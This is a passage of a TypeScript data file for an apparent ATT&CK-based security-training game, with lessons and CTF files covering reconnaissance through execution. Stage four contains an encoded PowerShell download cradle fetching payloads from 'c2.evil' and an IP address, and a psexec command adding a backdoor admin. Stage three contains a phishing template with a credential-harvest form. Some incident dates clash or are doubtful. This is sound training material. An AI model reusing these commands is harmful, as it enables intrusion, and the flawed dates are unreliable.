// Attribution: This module references MITRE ATT&CK® content.
// MITRE ATT&CK® is a registered trademark of The MITRE Corporation.
// Content based on the ATT&CK® knowledge base — licensed under CC BY 4.0.
// Source: https://attack.mitre.org/
import type { StageConfig, EpochConfig } from "./types";

export const mitreEpoch: EpochConfig = {
  id: "mitre",
  name: "MITRE ATT&CK",
  subtitle: "Adversary Tactics & Techniques",
  description: "Walk through all 12 ATT&CK tactic phases as the attacker — from reconnaissance to impact. Understand how real APTs operate and how defenders detect each phase using the industry-standard adversary framework.",
  emoji: "⚔️",
  color: "red",
  unlocked: true,
};

export const mitreStages: StageConfig[] = [
  // ─── mitre-01: Reconnaissance ─────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "MITRE Corporation HQ", location: "McLean, Virginia", era: "Present Day", emoji: "🔭" },
    id: "mitre-01",
    order: 1,
    title: "The Intelligence Gathering",
    subtitle: "TA0043 Reconnaissance — mapping the target before first contact",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-01", name: "Recon Specialist", emoji: "🔭" },
    challengeType: "ctf",
    info: {
      tagline: "The attacker who knows the most before touching a system wins before the fight begins.",
      year: 2013,
      overview: [
        "Reconnaissance (TA0043) is the first tactic in the MITRE ATT&CK framework. Before an attacker executes a single exploit, they spend weeks or months gathering intelligence: employee names and roles (LinkedIn), email formats (Hunter.io), technology stack (job postings, Shodan, BuiltWith), exposed infrastructure (Censys, FOFA), and leaked credentials (HaveIBeenPwned, dark web forums).",
        "ATT&CK distinguishes two reconnaissance sub-categories: active scanning (T1595 — sending probes to target infrastructure) and passive gathering (T1589/T1591/T1592 — querying public sources without touching the target). Passive recon is invisible to the target; active scanning may trigger IDS alerts.",
        "Defenders counter reconnaissance by reducing the attack surface: removing metadata from public documents (T1592.002), monitoring for active scanning via honeypots and firewall logs, and using threat intelligence feeds to detect adversary infrastructure being built against them.",
      ],
      technical: {
        title: "ATT&CK Reconnaissance Sub-Techniques",
        body: [
          "T1595 — Active Scanning: port scans (nmap), vulnerability scans (Nessus/OpenVAS), web crawling. Detectable via IDS/firewall logs for high-rate connection attempts from single IPs. T1589 — Gather Victim Identity Information: employee names, emails, roles from LinkedIn, company directories, and breach databases.",
          "T1596 — Search Open Technical Databases: Shodan (internet-connected devices), Censys (TLS certificates, open ports), BuiltWith (web technology stack). These tools query public indexes — no traffic reaches the target. T1598 — Phishing for Information: sending targeted emails to elicit credentials or internal documentation before the attack proper begins.",
        ],
        codeExample: {
          label: "Passive recon — technology stack fingerprinting (legitimate tools)",
          code: `# Shodan CLI — find target's exposed services (passive, no target contact)
shodan search "hostname:acme.com" --fields ip_str,port,product,version

# theHarvester — email and subdomain enumeration from public sources
theHarvester -d acme.com -b google,bing,linkedin,hunter

# Censys — enumerate TLS certificates for subdomains
curl "https://search.censys.io/api/v2/certificates/search?q=acme.com" \
  -H "Authorization: Bearer $CENSYS_API_KEY"

# Detect metadata in public PDFs (defender task)
exiftool annual-report.pdf | grep -E "Author|Creator|Producer|Company"`,
        },
      },
      incident: {
        title: "APT29 / Cozy Bear — SolarWinds Pre-Attack Recon (2019–2020)",
        when: "2019–December 2020",
        where: "SolarWinds, US Government agencies, Fortune 500 companies",
        impact: "18,000+ organizations compromised; access to NSA, Treasury, State Dept networks; Executive Order 14028 issued",
        body: [
          "Before inserting the SUNBURST backdoor into SolarWinds Orion, APT29 (Cozy Bear) conducted extensive reconnaissance on SolarWinds' development environment, customer list, and build pipeline. They identified that Orion was used by thousands of government and enterprise organizations — making it an ideal supply chain target. The reconnaissance phase lasted months before the first malicious code was written. APT29 monitored SolarWinds' GitHub activity, studied their build documentation, and identified the specific build server to target.",
          "The reconnaissance phase lasted months before the first malicious code was written. APT29 monitored SolarWinds' GitHub activity, studied their build documentation, and identified the specific build server to target. This level of pre-attack intelligence is characteristic of nation-state actors using T1589, T1591, and T1596. Organizations that had deployed threat intelligence feeds monitoring for their own domain names, employee names, and IP ranges in public scanning data would have seen early indicators of this reconnaissance activity — but none were looking.",
          "The SolarWinds breach triggered the most significant cybersecurity executive order in US history: Executive Order 14028 (May 2021), which mandated zero-trust architecture adoption, software bill of materials (SBOM) for federal software procurement, and supply chain security requirements across all federal civilian agencies. CISA, FBI, NSA, and ODNI issued a joint advisory retrospectively documenting the reconnaissance techniques used — specifically T1589 (Gather Victim Identity Information), T1591 (Gather Victim Org Information), and T1596 (Search Open Technical Databases) — to guide defenders on what passive recon detection looks like before an attack is ever launched. The SolarWinds case established that sophisticated adversaries invest months in understanding the target's environment before writing a single line of malicious code, and that pre-attack reconnaissance leaves detectable signals in Certificate Transparency logs, GitHub, Shodan, and threat intelligence feeds if defenders know where to look.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT Actor", sub: "passive + active recon", type: "attacker" },
          { label: "Public Sources", sub: "LinkedIn / Shodan / Censys", type: "system" },
          { label: "Target Organization", sub: "SolarWinds", type: "victim" },
          { label: "Attack Intelligence", sub: "employee list / tech stack / infra", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "MITRE ATT&CK framework created — first adversary behavior taxonomy" },
        { year: 2019, event: "APT29 begins SolarWinds reconnaissance — months before first exploit" },
        { year: 2020, event: "SUNBURST backdoor discovered — recon phase enabled supply chain precision", highlight: true },
        { year: 2021, event: "ATT&CK v10 adds Reconnaissance (TA0043) as a formal tactic" },
      ],
      keyTakeaways: [
        "Recon happens before first contact — defenders rarely see it in time",
        "Passive recon (Shodan, Censys, LinkedIn) leaves no trace on target systems",
        "Strip document metadata, limit technology disclosure in job postings",
        "Honeypots and canary tokens detect active scanning early",
      ],
      references: [
        { title: "ATT&CK TA0043 Reconnaissance", url: "https://attack.mitre.org/tactics/TA0043/" },
        { title: "SolarWinds Attack Analysis (CISA)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a" },
      ],
    },
    ctf: {
      scenario: "You are an APT analyst studying a reconnaissance operation. The attacker left their recon notes on a compromised jump box. Three files contain intelligence fragments — collect them to reconstruct the attack plan.",
      hint: "Recon notes are in /recon-op. Read each intelligence file.",
      hints: [
        "List /recon-op to find the intelligence files.",
        "passive-intel.txt contains the first fragment.",
        "Read all three files to assemble the flag.",
      ],
      files: {
        "/recon-op/passive-intel.txt": `# Passive Intelligence Gathered
# Target: AcmeCorp — no packets sent to target

Shodan results: 3 exposed services (RDP:3389, SSH:22, HTTPS:443)
LinkedIn: 847 employees, 12 IT staff identified
Email format: firstname.lastname@acme.com (confirmed via Hunter.io)
Tech stack: AWS, Kubernetes, GitHub Enterprise (via job postings)

Fragment-1: FLAG{TA0043_`,
        "/recon-op/active-scan.txt": `# Active Scan Results (nmap -sV)
# WARNING: Active scans may trigger IDS

acme-vpn.acme.com:443  — Cisco AnyConnect 4.9 (outdated, CVE-2021-1445)
acme-mail.acme.com:25  — Postfix 2.11 (outdated)
acme-dev.acme.com:8080 — Jenkins 2.263 (unauthenticated dashboard accessible)

Jenkins access = potential build pipeline entry point

Fragment-2: R3C0N_`,
        "/recon-op/attack-plan.txt": `# Attack Plan — Phase 2: Initial Access

Target: Jenkins on acme-dev.acme.com:8080 (T1195 — supply chain)
Backup: Spear phish IT staff with fake GitHub security alert

Recon complete. Moving to resource development.

Fragment-3: APT29}`,
      },
      dirs: {
        "/": [{ name: "recon-op", isDir: true }],
        "/recon-op": [
          { name: "passive-intel.txt", isDir: false },
          { name: "active-scan.txt", isDir: false },
          { name: "attack-plan.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/recon-op/passive-intel.txt", value: "FLAG{TA0043_", label: "Fragment 1 — Passive Intel" },
        { trigger: "/recon-op/active-scan.txt", value: "R3C0N_", label: "Fragment 2 — Active Scan" },
        { trigger: "/recon-op/attack-plan.txt", value: "APT29}", label: "Fragment 3 — Attack Plan" },
      ],
    },
  },

  // ─── mitre-02: Resource Development ──────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Dark Web Infrastructure", location: "Tor Network, Eastern Europe", era: "Present Day", emoji: "💻" },
    id: "mitre-02",
    order: 2,
    title: "The Arsenal Builder",
    subtitle: "TA0042 Resource Development — staging infrastructure before the attack",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-02", name: "Infrastructure Architect", emoji: "🏗️" },
    challengeType: "ctf",
    info: {
      tagline: "Professional attackers build their weapons before they pick their targets.",
      year: 2020,
      overview: [
        "Resource Development (TA0042) covers everything an attacker acquires or builds before executing the attack: C2 infrastructure, exploit tools, malware, compromised accounts, and digital certificates for code signing. Nation-state actors and sophisticated criminal groups invest weeks in this phase.",
        "Key techniques: T1583 — Acquire Infrastructure (VPS servers, domains, cloud accounts purchased with stolen credit cards or cryptocurrency), T1584 — Compromise Infrastructure (hack legitimate websites to use as C2 relays), T1587 — Develop Capabilities (custom malware, zero-day exploits), T1588 — Obtain Capabilities (purchase tools from dark web forums).",
        "Defenders detect resource development through threat intelligence sharing — when an attacker registers a domain that looks like a target company (typosquatting), threat intel feeds flag it. Certificate Transparency logs reveal newly issued certificates for lookalike domains. Passive DNS monitoring catches C2 infrastructure before it is used.",
      ],
      technical: {
        title: "C2 Infrastructure Patterns",
        body: [
          "Modern C2 infrastructure uses multiple layers to evade takedown: redirectors (cheap VPS servers that forward traffic to the real C2), domain fronting (routing C2 traffic through CDNs like Cloudflare), and dead drop resolvers (social media profiles or Pastebin posts containing the current C2 IP address).",
          "Defenders use: domain age checking (newly registered domains are suspicious), passive DNS (track IP-to-domain resolutions over time), WHOIS privacy patterns (all info hidden + registered with privacy service = higher risk), and JA3 TLS fingerprinting (C2 frameworks have distinctive TLS handshake patterns).",
        ],
        codeExample: {
          label: "C2 domain detection — passive DNS and certificate transparency",
          code: `# Check domain age and registration patterns (defender)
whois target-domain.com | grep -E "Creation Date|Registrar|Name Server"

# Certificate Transparency log monitoring — find lookalike domains
# crt.sh API
curl "https://crt.sh/?q=%.acme.com&output=json" | jq '.[].name_value' | sort -u

# Passive DNS — find domains resolving to known C2 IP
curl "https://api.passivetotal.org/v2/dns/passive" \
  -u "$PT_USER:$PT_KEY" \
  -d '{"query": "185.220.101.42"}'

# JA3 TLS fingerprint check against known C2 frameworks
zeek -r capture.pcap -e 'print c$ssl$ja3' | sort | uniq -c`,
        },
      },
      incident: {
        title: "Lazarus Group — Operation AppleJeus Infrastructure (2018)",
        when: "2018–ongoing",
        where: "Global — cryptocurrency exchanges, financial institutions across 30+ countries",
        impact: "$2B+ stolen in cryptocurrency; DPRK nuclear program partially funded by crypto theft; UN Panel of Experts documented $3B in total Lazarus theft 2017–2023",
        body: [
          "North Korea's Lazarus Group (APT38) built elaborate resource development pipelines for Operation AppleJeus: they registered legitimate-looking cryptocurrency software companies, built real websites and GitHub profiles, developed trojanized crypto trading software (QTBitcoinTrader, Celas Trade Pro), and signed the malware with legitimate code signing certificates purchased under the fake company identities. The infrastructure was so convincing that victims willingly downloaded and ran the malware from what appeared to be a legitimate software vendor.",
          "The entire operation — company registration, website development, software development, certificate acquisition — was complete before any target was approached. This is resource development at nation-state scale: building the attack infrastructure as a business before engaging any victim. Lazarus continued the same pattern through 2023, expanding to DeFi protocols, NFT platforms, and Web3 game companies — adapting the fake company model to each new cryptocurrency sector.",
          "Lazarus Group's financial motivation is directly connected to North Korea's sanctions-constrained economy. UN Panel of Experts reports have documented that DPRK used cryptocurrency theft to fund its nuclear and ballistic missile programs — citing approximately $3 billion in losses attributable to Lazarus/APT38 between 2017 and 2023, including $625M from the Ronin Network (Axie Infinity) bridge in March 2022. After AppleJeus, CISA and US-CERT published indicators including certificate thumbprints, domain patterns, and JA3 TLS fingerprints associated with Lazarus infrastructure. Certificate Transparency (CT) log monitoring for newly-issued certificates matching lookalike domain patterns is now a standard enterprise threat intelligence practice specifically because Lazarus and similar actors rely on building convincing digital identities — and every certificate they acquire leaves a permanent, searchable record in the CT log.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Lazarus Group", sub: "nation-state APT (DPRK)", type: "attacker" },
          { label: "Fake Company + Cert", sub: "T1583 + T1588.003", type: "system" },
          { label: "Crypto Exchange Targets", sub: "30+ countries", type: "victim" },
          { label: "$2B Stolen", sub: "cryptocurrency theft", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "Lazarus AppleJeus — fake crypto company + trojanized software" },
        { year: 2020, event: "ATT&CK v7 formalizes Resource Development (TA0042) as a tactic", highlight: true },
        { year: 2021, event: "Domain fronting via major CDNs largely blocked; attackers shift to redirectors" },
        { year: 2023, event: "Lazarus steals $600M from Ronin Bridge — same infrastructure patterns" },
      ],
      keyTakeaways: [
        "Resource development happens before the first victim interaction — detect it with threat intel",
        "Monitor Certificate Transparency logs for lookalike domains targeting your org",
        "Domain age + hidden WHOIS + new cert = high-risk domain pattern",
        "JA3 TLS fingerprinting identifies C2 frameworks by their handshake signature",
      ],
      references: [
        { title: "ATT&CK TA0042 Resource Development", url: "https://attack.mitre.org/tactics/TA0042/" },
        { title: "Operation AppleJeus (Kaspersky)", url: "https://securelist.com/operation-applejeus/87553/" },
      ],
    },
    ctf: {
      scenario: "You've seized a threat actor's development server. Their C2 infrastructure notes are split across three files. Collect the fragments to understand their operation.",
      hint: "Infrastructure notes are in /c2-dev. Read each configuration file.",
      hints: [
        "List /c2-dev to find the attacker's notes.",
        "The domain registration notes contain the first fragment.",
        "Read all three files to complete the flag.",
      ],
      files: {
        "/c2-dev/domains.txt": `# Domain Registration Notes
# All registered via Njalla (anonymous) with Monero payment

Primary C2:  secure-update-cdn.com      (registered 2024-10-01, 90-day cert)
Redirector:  cdn-delivery-network.net   (compromised legitimate site)
Fallback:    git-security-patch.org     (domain fronting via Cloudflare)

Fragment-1: FLAG{TA0042_`,
        "/c2-dev/malware-notes.txt": `# Capability Development Notes

BEACON variant: custom Go implant, JA3 fingerprint randomized per build
Signing cert: purchased under "Secure Dev Solutions LLC" (shell company)
Packer: custom LLVM obfuscator, new build per campaign

Fragment-2: R3S_D3V_`,
        "/c2-dev/opsec.txt": `# OpSec Notes

- Never access C2 from home IP — always through Tor exit or rented VPS
- Domains: rotate every 90 days before cert expiry draws attention
- Infrastructure paid via Monero — no fiat trail

Fragment-3: C2}`,
      },
      dirs: {
        "/": [{ name: "c2-dev", isDir: true }],
        "/c2-dev": [
          { name: "domains.txt", isDir: false },
          { name: "malware-notes.txt", isDir: false },
          { name: "opsec.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/c2-dev/domains.txt", value: "FLAG{TA0042_", label: "Fragment 1 — Domains" },
        { trigger: "/c2-dev/malware-notes.txt", value: "R3S_D3V_", label: "Fragment 2 — Malware Notes" },
        { trigger: "/c2-dev/opsec.txt", value: "C2}", label: "Fragment 3 — OpSec" },
      ],
    },
  },

  // ─── mitre-03: Initial Access ─────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "RSA Conference", location: "San Francisco, California", era: "Present Day", emoji: "🎣" },
    id: "mitre-03",
    order: 3,
    title: "The First Foothold",
    subtitle: "TA0001 Initial Access — spear phishing gets the first shell",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-03", name: "Social Engineer", emoji: "🎣" },
    challengeType: "ctf",
    info: {
      tagline: "The most sophisticated exploit is often an email. People are the perimeter.",
      year: 2016,
      overview: [
        "Initial Access (TA0001) covers the techniques attackers use to gain their first foothold inside a target environment. Despite decades of security investment, spear phishing (T1566) remains the most successful initial access technique — used in over 90% of nation-state intrusions according to Verizon DBIR data.",
        "Spear phishing is targeted: the attacker uses reconnaissance data to craft a message that appears to come from a trusted source (T1566.001 — malicious attachment, T1566.002 — malicious link, T1566.003 — service spear phishing via Slack/Teams/LinkedIn). The payload executes when the victim opens the attachment or clicks the link.",
        "Other initial access techniques: T1190 — Exploit Public-Facing Application (SQL injection, web shell on internet-exposed systems), T1133 — External Remote Services (VPN/RDP with stolen credentials), T1195 — Supply Chain Compromise (as in SolarWinds). All result in the attacker gaining an execution foothold.",
      ],
      technical: {
        title: "Spear Phishing Detection and Defense",
        body: [
          "Email security controls that stop spear phishing: DMARC/DKIM/SPF (prevent domain spoofing), sandboxing (execute attachments in isolated VM and observe behavior), URL rewriting (redirect links through a proxy that blocks malicious destinations), and anti-phishing AI (detect lookalike domains and suspicious sender patterns).",
          "Behavioral detection: the first process spawned by a user clicking a document (Word spawning PowerShell, Excel spawning wscript.exe) is a high-fidelity indicator. EDR tools like CrowdStrike Falcon detect parent-child process relationships that indicate exploitation.",
        ],
        codeExample: {
          label: "Spear phish detection — DMARC/DKIM verification",
          code: `# Check DMARC record for a domain (defender)
dig TXT _dmarc.acme.com

# Verify DKIM signature on received email header
# Look for: DKIM-Signature: a=rsa-sha256; d=sender.com; s=selector
# Then verify the selector's public key
dig TXT selector._domainkey.sender.com

# SPF check — did the sending IP match the allowed senders?
# Look in email headers for:
# Received-SPF: pass (google.com: domain of user@acme.com designates 209.85.220.41)

# Suspicious parent-child process (EDR detection rule)
# Alert: WINWORD.EXE spawning powershell.exe
# MITRE T1566.001 + T1059.001`,
        },
      },
      incident: {
        title: "DNC Hack — Spear Phishing Delivers Initial Access (2016)",
        when: "March 2016",
        where: "Democratic National Committee, John Podesta — Washington D.C.",
        impact: "Thousands of emails stolen and published by WikiLeaks; significant US election interference; Mueller investigation; DMARC mandated for .gov domains",
        body: [
          "APT28 (Fancy Bear, GRU Unit 26165) gained initial access to the DNC via a spear phishing email sent to John Podesta. The email spoofed a Google security alert claiming his Gmail account had been accessed from Ukraine. Podesta's aide forwarded it to IT, who mistakenly confirmed it was 'legitimate' — Podesta clicked the link and entered his credentials on a pixel-perfect Google login clone hosted on a domain registered by APT28 days earlier.",
          "DMARC was not configured on google.com to block the spoofed sender at the time. The entire operation — recon, domain registration, phishing page, credential harvest — cost the attackers approximately $5 in infrastructure and netted a geopolitical impact worth billions. The stolen emails were passed to WikiLeaks and published strategically during the Democratic National Convention and in October 2016 before the election.",
          "The political consequences — Russian interference in the 2016 US presidential election, the Mueller investigation, Senate Intelligence Committee reports — made the DNC breach the highest-profile case of a nation-state cyberattack achieving strategic geopolitical impact via a $5 infrastructure investment. The breach catalyzed major security improvements: the DNC hired a dedicated CISO, US government agencies began providing cybersecurity threat briefings to political campaigns, and election security became a formally funded federal program (EAC, CISA election security programs). DMARC adoption by government organizations accelerated dramatically: the US State Department mandated DMARC p=reject for all .gov domains by 2018, specifically citing email phishing as the primary threat addressed. The $5 infrastructure cost versus billions in geopolitical impact remains the canonical illustration of why phishing prevention — with its clear, measurable ROI — deserves the highest priority in any security program.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT28", sub: "Fancy Bear (GRU)", type: "attacker" },
          { label: "Spear Phish Email", sub: "fake Google security alert", type: "system" },
          { label: "John Podesta / DNC", sub: "credential harvested", type: "victim" },
          { label: "Email Archive Stolen", sub: "WikiLeaks publication", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "DNC spear phish — APT28 gains initial access via credential harvest" },
        { year: 2017, event: "Verizon DBIR confirms phishing in 93% of breaches as initial vector", highlight: true },
        { year: 2021, event: "Microsoft 365 Defender adds spear phish sandbox across all mailboxes" },
        { year: 2024, event: "AI-generated spear phishing increases success rates significantly" },
      ],
      keyTakeaways: [
        "Spear phishing drives 90%+ of nation-state initial access — it's the #1 vector",
        "Deploy DMARC/DKIM/SPF + email sandboxing + URL rewriting on all corporate email",
        "EDR parent-child process rules catch post-exploitation before lateral movement",
        "DMARC p=reject + BIMI are the gold standard for anti-spoofing",
      ],
      references: [
        { title: "ATT&CK T1566 Phishing", url: "https://attack.mitre.org/techniques/T1566/" },
        { title: "Podesta Email Hack Timeline (Wired)", url: "https://www.wired.com/2016/12/how-the-2016-election-hack-works/" },
      ],
    },
    ctf: {
      scenario: "You are analyzing a spear phishing campaign. The attacker's phishing kit was seized. Three files contain the campaign configuration — collect the fragments to understand the attack chain.",
      hint: "Phishing kit files are in /phish-kit. Read each component file.",
      hints: [
        "List /phish-kit to find the campaign files.",
        "The email template contains the first fragment.",
        "Read the landing page and credential log for the remaining pieces.",
      ],
      files: {
        "/phish-kit/email-template.html": `<!-- Spear Phish Email Template -->
<!-- Target: IT staff at acme.com -->
<h2>Security Alert: Unusual sign-in activity</h2>
<p>We detected a sign-in to your account from Ukraine (IP: 91.108.4.1).</p>
<p>If this wasn't you, <a href="https://accounts-google-secure.com/verify">secure your account now</a>.</p>
<!-- Sender spoofed as: security-noreply@google.com -->
<!-- Fragment-1: FLAG{TA0001_ -->`,
        "/phish-kit/landing-page.html": `<!-- Credential Harvest Landing Page -->
<!-- Hosted on: accounts-google-secure.com (registered 3 days ago) -->
<form method="POST" action="/collect">
  <input type="email" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button>Sign in</button>
</form>
<!-- After submit: redirect to real Google to avoid suspicion -->
<!-- Fragment-2: SPH1SH_ -->`,
        "/phish-kit/creds.log": `# Harvested Credentials
# Campaign start: 2024-11-01

admin@acme.com : P@ssw0rd2024!        [11-01 09:14 UTC]
it-helpdesk@acme.com : Acme2024#     [11-01 09:31 UTC]
cfo@acme.com : Welcome1!              [11-01 11:02 UTC]

# Fragment-3: 1N1T14L}`,
      },
      dirs: {
        "/": [{ name: "phish-kit", isDir: true }],
        "/phish-kit": [
          { name: "email-template.html", isDir: false },
          { name: "landing-page.html", isDir: false },
          { name: "creds.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/phish-kit/email-template.html", value: "FLAG{TA0001_", label: "Fragment 1 — Email Template" },
        { trigger: "/phish-kit/landing-page.html", value: "SPH1SH_", label: "Fragment 2 — Landing Page" },
        { trigger: "/phish-kit/creds.log", value: "1N1T14L}", label: "Fragment 3 — Credential Log" },
      ],
    },
  },

  // ─── mitre-04: Execution ──────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "NSA", location: "Fort Meade, Maryland", era: "Present Day", emoji: "⚡" },
    id: "mitre-04",
    order: 4,
    title: "The Code Runner",
    subtitle: "TA0002 Execution — PowerShell and living-off-the-land scripts",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-04", name: "Execution Engineer", emoji: "⚡" },
    challengeType: "ctf",
    info: {
      tagline: "The best malware uses tools already installed on the victim's machine.",
      year: 2017,
      overview: [
        "Execution (TA0002) covers the techniques attackers use to run their malicious code on a target system after gaining initial access. The dominant execution technique in modern intrusions is T1059 — Command and Scripting Interpreter, specifically PowerShell (T1059.001), which is built into every Windows system and trusted by default.",
        "Living-off-the-land (LOLBins) execution abuses legitimate Windows tools: PowerShell, WMI, mshta.exe, regsvr32.exe, certutil.exe, and rundll32.exe to execute attacker-supplied code. Because these are signed Microsoft binaries, they bypass application whitelisting and many AV products.",
        "Detection focuses on behavioral indicators: PowerShell with -EncodedCommand flag (common in malware), PowerShell downloading files from the internet (IEX (New-Object Net.WebClient).DownloadString), WMI subscription creation, and unsigned scripts running with execution policy bypass.",
      ],
      technical: {
        title: "PowerShell Execution Detection",
        body: [
          "Enable PowerShell Script Block Logging (Event ID 4104) — this captures the actual decoded script content even when -EncodedCommand is used. Enable Module Logging (Event ID 4103) and Transcription. These three settings together make PowerShell nearly transparent to defenders.",
          "Constrained Language Mode (CLM) restricts PowerShell to prevent attackers from using .NET types, COM objects, and ALLOWED_TYPES. Combined with AppLocker or WDAC (Windows Defender Application Control), CLM prevents most PowerShell-based execution techniques.",
        ],
        codeExample: {
          label: "PowerShell attack patterns and detection",
          code: `# ATTACKER: Encoded PowerShell (obfuscated download cradle)
powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...

# Decoded: IEX(New-Object Net.WebClient).DownloadString('http://c2.evil/payload.ps1')

# DEFENDER: Enable Script Block Logging via GPO
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" \`
  -Name "EnableScriptBlockLogging" -Value 1

# DEFENDER: Hunt for encoded commands in Event ID 4104
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object {$_.Id -eq 4104 -and $_.Message -match "EncodedCommand|DownloadString|IEX"}`,
        },
      },
      incident: {
        title: "NotPetya — WMI and PSEXEC for Execution (2017)",
        when: "June 27, 2017",
        where: "Ukraine, spreading globally — Maersk, FedEx, Merck, Mondelez, Reckitt Benckiser",
        impact: "$10B+ damages (highest cyberattack cost in history); first multilateral government attribution of Russia for destructive cyberattack",
        body: [
          "NotPetya used multiple execution techniques after gaining initial access: WMI (T1047) for remote execution, PsExec (T1569.002) for lateral movement execution, and WMIC to spread across the network. It combined stolen credentials (via credential dumping) with legitimate Windows remote execution tools — a classic LOLBin attack. Because NotPetya used only legitimate Windows tools for execution, traditional signature-based AV products did not trigger — the execution chain looked identical to legitimate system administration.",
          "The combination was devastating: Maersk, the world's largest shipping company, had its entire global network of 45,000 PCs and 4,000 servers wiped in hours. The credential cascade meant that compromising one system with an admin who had logged on recently was enough to reach every other system that admin had ever touched. FedEx's TNT subsidiary suffered $400M in losses. Merck's pharmaceutical manufacturing was disrupted. Reckitt Benckiser lost £100M. Total global damages exceeded $10 billion.",
          "The US, UK, EU, Canada, Australia, and New Zealand jointly attributed NotPetya to Russian GRU Unit 74455 (Sandworm) in February 2018 — the first time multiple allied governments publicly named Russia for a destructive cyberattack. The attribution led to indictments of six GRU officers in October 2020 and became the predicate for subsequent sanctions. For defenders, NotPetya established PowerShell Script Block Logging (Event 4104), WMI activity monitoring (Sysmon Events 19/20/21), and PsExec detection as baseline SOC controls — specifically because NotPetya demonstrated what $10 billion of damage looks like when defenders cannot see LOLBin execution chains that are indistinguishable from legitimate administration traffic.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "NotPetya / Sandworm (GRU)", type: "attacker" },
          { label: "WMI + PsExec + Mimikatz", sub: "LOLBin execution chain", type: "system" },
          { label: "Windows Endpoints", sub: "Maersk / FedEx / Merck", type: "victim" },
          { label: "$10B Damages", sub: "wiper disguised as ransomware", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "NotPetya — WMI/PsExec LOLBin execution causes $10B global damage" },
        { year: 2019, event: "PowerShell Script Block Logging becomes standard SOC detection control", highlight: true },
        { year: 2022, event: "WDAC + Constrained Language Mode deployment grows in enterprise" },
        { year: 2024, event: "AI-powered behavioral execution detection reduces dwell time significantly" },
      ],
      keyTakeaways: [
        "Enable PowerShell Script Block Logging (Event 4104) — it decodes -EncodedCommand",
        "LOLBins use signed Microsoft tools — signature-based AV is blind to them",
        "Constrained Language Mode + AppLocker blocks most PowerShell execution techniques",
        "Behavioral detection (PowerShell → network connection) beats signature detection",
      ],
      references: [
        { title: "ATT&CK T1059.001 PowerShell", url: "https://attack.mitre.org/techniques/T1059/001/" },
        { title: "NotPetya Analysis (Wired)", url: "https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/" },
      ],
    },
    ctf: {
      scenario: "A compromised workstation has attacker execution artifacts on disk. Three log files captured the execution chain. Read them to reconstruct the attack and collect the flag.",
      hint: "Execution logs are in /exec-logs. Read each log file.",
      hints: [
        "List /exec-logs to find the artifact files.",
        "The PowerShell log contains the first fragment.",
        "Read wmi.log and psexec.log for the remaining fragments.",
      ],
      files: {
        "/exec-logs/powershell-4104.log": `# PowerShell Script Block Log — Event ID 4104
# Timestamp: 2024-11-15 03:14:22 UTC

ScriptBlock: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.42/stage2.ps1')
CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDIvc3RhZ2UyLnBzMScpKQ==
ParentProcess: WINWORD.EXE

Fragment-1: FLAG{TA0002_`,
        "/exec-logs/wmi.log": `# WMI Execution Log
# Timestamp: 2024-11-15 03:15:01 UTC

wmic.exe /node:192.168.1.45 process call create "powershell.exe -Enc SUVYKChOZXct..."
wmic.exe /node:192.168.1.67 process call create "powershell.exe -Enc SUVYKChOZXct..."
wmic.exe /node:192.168.1.23 process call create "powershell.exe -Enc SUVYKChOZXct..."

# WMI used to replicate execution to 3 additional hosts

Fragment-2: 3X3C_`,
        "/exec-logs/psexec.log": `# PsExec Execution Log
# Timestamp: 2024-11-15 03:16:44 UTC

psexec.exe \\\\DC01 -s cmd.exe /c "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"

# Backdoor admin account created on domain controller

Fragment-3: L0LB1N}`,
      },
      dirs: {
        "/": [{ name: "exec-logs", isDir: true }],
        "/exec-logs": [
          { name: "powershell-4104.log", isDir: false },
          { name: "wmi.log", isDir: false },
          { name: "psexec.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/exec-logs/powershell-4104.log", value: "FLAG{TA0002_", label: "Fragment 1 — PowerShell Log" },
        { trigger: "/exec-logs/wmi.log", value: "3X3C_", label: "Fragment 2 — WMI Log" },
        { trigger: "/exec-logs/psexec.log", value: "L0LB1N}", label: "Fragment 3 — PsExec Log" },
      ],
    },
  },

  // ─── mitre-05: Persistence ────────────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Mandiant HQ", location: "Reston, Virginia", era: "Present Day", emoji: "🔄" },
    id: "mitre-05",
    order: 5,
    title: "The Squatter",
    subtitle: "TA0003 Persistence — registry run keys and scheduled tasks",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-05", name: "Persistence Engineer", emoji: "🔄" },
    challengeType: "ctf",
    info: {
      tagline: "Initial access is rented. Persistence is ownership.",
      year: 2014,
      overview: [
